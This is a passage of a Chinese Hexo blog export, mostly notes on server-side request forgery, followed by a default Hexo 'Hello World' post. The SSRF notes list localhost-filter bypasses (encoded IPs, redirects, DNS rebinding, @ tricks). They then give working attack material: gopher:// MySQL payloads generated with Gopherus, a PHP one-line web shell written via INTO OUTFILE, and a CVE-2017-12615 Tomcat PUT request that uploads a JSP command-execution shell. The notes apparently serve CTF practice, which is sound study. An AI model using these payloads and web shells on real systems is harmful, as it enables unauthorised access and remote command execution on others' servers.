class="hljs-string">&quot;127.0.0.1&quot;</span><br>hex_ip=$(printf <span class="hljs-string">&#x27;%02x&#x27;</span> $&#123;ip<span class="hljs-comment">//./ &#125;)</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$hex_ip</span><br></code></pre></td></tr></table></figure><p>得到<code>127.0.0.1</code>的16进制是<code>0x7f000001</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/flag.php<br>八进制<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">017700000001</span><span class="hljs-regexp">/flag.php  点分式  http:/</span><span class="hljs-regexp">/0177.0000.0000.0001/</span>flag.php<br>十六进制<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">0</span>x7F000001<span class="hljs-regexp">/flag.php    点分式  http:/</span><span class="hljs-regexp">/0x7F.0x00.0x00.0x01/</span>flag.php<br>十进制<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">2130706433</span>/flag.php<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">当有的对跳转的地址的长度有要求<br>host&lt;5<br>url=http://0/flag.php<br>url=http://127.1/flag.php<br>host&lt;3<br>url=http://0/flag.php<br></code></pre></td></tr></table></figure><h3 id="302重定向绕过"><a href="#302重定向绕过" class="headerlink" title="302重定向绕过"></a>302重定向绕过</h3><figure class="highlight php"><figcaption><span>file:index.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: http://127.0.0.1/flag.php&quot;</span>)<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>php -S 0.0.0.0:1234</code></p><p>使用<code>https://tinyurl.com</code>生成302跳转地址(<a href="https://tinyurl.com生成302跳转地址/">https://tinyurl.xn--com302-u20k9dv69h8r7bzc7cjyd/</a>)</p><h3 id="DNS重绑定绕过"><a href="#DNS重绑定绕过" class="headerlink" title="DNS重绑定绕过"></a>DNS重绑定绕过</h3><p>原理：服务器两次解析同一域名的短暂间隙，更换域名背后的ip，达到突破同源策略或过WAF进行SSRF的目的<br>DNS中的机制TTL：域名和IP绑定关系的Cache存活的最长时间。<br>某些情况下，可以对同一个域名设置两个记录（一个内网、一个外网），随机访问一个，概率成功</p><p><code>https://lock.cmpxchg8b.com/rebinder.html</code><br><code>http://7f000001.c0a80001.rbndr.us/flag.php</code></p><h3 id="域名绕过"><a href="#域名绕过" class="headerlink" title="域名绕过"></a>域名绕过</h3><p>限制为<a href="http://www.xxx.com/">http://www.xxx.com</a> 域名<br>采用http基本身份认证的方式绕过。即@<br><code>http://www.xxx.com@www.xxc.com</code></p><h3 id="其他绕过"><a href="#其他绕过" class="headerlink" title="其他绕过"></a>其他绕过</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs dns">当不允许ip为内网地址时<br>（<span class="hljs-number">1</span>）采取短网址绕过  https://<span class="hljs-number">0</span>x9.me/cuGfD    <br>推荐：http://tool.chinaz.com/tools/dwz.aspx、https://dwz.cn/<br>（<span class="hljs-number">2</span>）采取特殊域名<br>（<span class="hljs-number">3</span>）采取进制转换<br><br>白名单，一定要请求某个IP或域名的情况，这个时候在url后面跟上@符号，浏览器会访问@后面的域名或ip eg:http://abc.com@<span class="hljs-number">127.0.0.1</span><br>句号绕过         <span class="hljs-number">127。0。0。1</span> &gt;&gt;&gt; <span class="hljs-number">127.0.0.1</span><br>利用[::]绕过         http://[::]:<span class="hljs-number">80</span>/ &gt;&gt;&gt; http://<span class="hljs-number">127.0.0.1</span><br><br><br>可以指向任意ip的域名　 <br>xip.io     <br>[xip.io](http://xip.io/)<br>[xip.io<span class="hljs-number">127.0.0.1</span>.xip.io](http://xip.io<span class="hljs-number">127.0.0.1</span>.xip.io/) --&gt;<span class="hljs-number">127.0.0.1</span><br>[www.<span class="hljs-number">127.0.0.1</span>.xip.io](http://www.<span class="hljs-number">127.0.0.1</span>.xip.io/) --&gt;<span class="hljs-number">127.0.0.1</span><br>[Haha.<span class="hljs-number">127.0.0.1</span>.xip.io](http://haha.<span class="hljs-number">127.0.0.1</span>.xip.io/) --&gt;<span class="hljs-number">127.0.0.1</span><br>[Haha.xixi.<span class="hljs-number">127.0.0.1</span>.xip.io](http://haha.xixi.<span class="hljs-number">127.0.0.1</span>.xip.io/) --&gt;<span class="hljs-number">127.0.0.1</span><br>原理是DNS解析。xip.io可以指向任意域名，即<span class="hljs-number">127.0.0.1</span>.xip.io，可解析为<span class="hljs-number">127.0.0.1</span><br><br></code></pre></td></tr></table></figure><h2 id="SSRF利用"><a href="#SSRF利用" class="headerlink" title="SSRF利用"></a>SSRF利用</h2><h3 id="对MySQL进行未授权查询"><a href="#对MySQL进行未授权查询" class="headerlink" title="对MySQL进行未授权查询"></a>对MySQL进行未授权查询</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">tcpdump -i lo port 3306 -w mysql.pcapng<br><span class="hljs-comment">#-w 写文件，在根目录下</span><br>mysql -h127.0.0.1 -uroot --ssl-mode=DISABLED -e <span class="hljs-string">&quot;show databases;&quot;</span><br>show databases;<br></code></pre></td></tr></table></figure><p>将抓取的文件复制到本地，Wireshark打开，跟踪TCP流，筛选目标端口3306，show data as raw data</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">5b0000000a352e352e352d31302e31312e322d4d6172696144422d3100210000006e673b2e72767b2700fef72d0200ff81150000000000001d0000004b24702e2e3c243f4f502669006d7973716c5f6e61746976655f70617373776f726400<br>bb00000184a2bf000000000121000000000000000000000000000000000000001d000000726f6f7400006d7973716c5f6e61746976655f70617373776f7264007e035f6f73054c696e75780c5f636c69656e745f6e616d650a6c69626d617269616462045f7069640531323339390f5f636c69656e745f76657273696f6e05332e332e34095f706c6174666f726d067838365f36340c70726f6772616d5f6e616d65056d7973716c0c5f7365727665725f686f7374093132372e302e302e31<br>32000002ffa2062332383030304163636573732064656e69656420666f7220757365722027726f6f742740276c6f63616c686f737427<br></code></pre></td></tr></table></figure><p>复制数据去掉换行，ASCII转URL编码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">results</span>(<span class="hljs-params">s</span>):<br>    a=[s[i:i+<span class="hljs-number">2</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(s),<span class="hljs-number">2</span>)]<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;curl gopher://127.0.0.1:3306/_%&quot;</span>+<span class="hljs-string">&quot;%&quot;</span>.join(a)<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    s=sys.argv[<span class="hljs-number">1</span>]<br>    <span class="hljs-built_in">print</span>(results(s))<br></code></pre></td></tr></table></figure><p>复制，更改对应IP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/tarunkant/Gopherus<br>python2.7 gopherus.py --exploit mysql<br>会输出：<br>Give MYSQL username:<br>Give query to execute:<br></code></pre></td></tr></table></figure><h3 id="对MySQL未授权文件写入"><a href="#对MySQL未授权文件写入" class="headerlink" title="对MySQL未授权文件写入"></a>对MySQL未授权文件写入</h3><p>查看写入权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">python2.7 gopherus.py --exploit mysql<br>Give MYSQL username:  root<br>Give query to execute:  show variables like <span class="hljs-string">&#x27;%secure%&#x27;</span>;<br></code></pre></td></tr></table></figure><p><code>secure_file_priv</code>后面为空则可写入<br>使用into outfile生成cmd.php写入一句话木马</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">python2.7 gopherus.py --exploit mysql<br>Give MYSQL username:  root<br>Give query to execute:  <span class="hljs-keyword">select</span> <span class="hljs-string">&quot;&lt;?php system(<span class="hljs-variable">$_GET</span>[&#x27;cmd&#x27;]);?&gt;&quot;</span> into outfile <span class="hljs-string">&#x27;/var/www/html/cmd.php&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="对tomcat文件写入"><a href="#对tomcat文件写入" class="headerlink" title="对tomcat文件写入"></a>对tomcat文件写入</h3><p>利用Tomcat漏洞，CVE-2017-12615进行任意文件上传</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs jsp">PUT /<span class="hljs-number">1.</span>jsp/ HTTP/<span class="hljs-number">1.1</span><br>HOST: ip:<span class="hljs-number">8080</span><br>Accetp: *<span class="hljs-comment">/*</span><br><span class="hljs-comment">Accept-Language: en</span><br><span class="hljs-comment">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="hljs-comment">Connection: close</span><br><span class="hljs-comment">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-comment">Content-Length: 532</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">&lt;%</span><br><span class="hljs-comment">    String command = request.getParameter(&quot;cmd&quot;);</span><br><span class="hljs-comment">    if(command!=null)&#123;</span><br><span class="hljs-comment">        java.io.InputStream</span><br><span class="hljs-comment">        in=Runtime.getRuntime().exec(command).getInputStream();</span><br><span class="hljs-comment">        int a=-1;</span><br><span class="hljs-comment">        byte[] b= new byte[2048];</span><br><span class="hljs-comment">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="hljs-comment">        while((a=in.read(b))!=-1)&#123;</span><br><span class="hljs-comment">            out.println(new String(b));</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">        out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    else&#123;</span><br><span class="hljs-comment">         out.print(&quot;format: xxx.jsp?cmd=Command&quot;);</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">%&gt;</span><br></code></pre></td></tr></table></figure><p>利用gopher，然后burp两次URL编码后提交</p>]]></content>
    
    
    
    <tags>
      
      <tag>WEB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2025/03/22/hello-world/"/>
    <url>/2025/03/22/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
